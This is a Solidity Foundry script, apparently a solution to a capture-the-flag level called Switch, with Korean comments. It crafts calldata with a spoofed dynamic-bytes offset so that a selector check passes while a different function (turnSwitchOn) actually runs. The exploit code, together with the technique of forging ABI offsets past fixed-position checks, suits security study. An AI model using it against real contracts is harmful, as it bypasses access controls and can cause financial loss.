// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchScript is Script {

    address constant private SWITCH = 0x9999714C5c95Dd569f366319E16CD50Eae9fC803;

    function run() public {
        vm.startBroadcast();

        bytes4 offSelector  = bytes4(keccak256("turnSwitchOff()"));

        (bool ok, ) = SWITCH.call(
            abi.encodePacked(
                Switch.flipSwitch.selector,                       // [0..3]   flipSwitch(bytes) 셀렉터(4B) -> 동적 인수이므로 1. selector, 2. offset, 3. length, 4. data
                abi.encode(96),                                   // [4..35]  96바이트뒤에(132바이트) 진짜 데이터 시작이라고 거짓말침 -> offset부분
                abi.encode(0x00),                                 // [36..67] 원래 length 부분은 더미로 채움
                abi.encode(offSelector),                          // [68..99] 32B 중 앞 4B에 offSelector 라고 명시하여 onlyOff()에 require 문 통과
                abi.encode(4),                                    // [100..131] 위에서 132바이트부터 실제 데이터가 시작이라고 명시해 뒀으니 직전에는 length가 존재해야해서 4라는 값으로 채움
                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // [132..135] _data 실제 값(4B)
            )
        );
        require(ok);

        vm.stopBroadcast();
    }
}
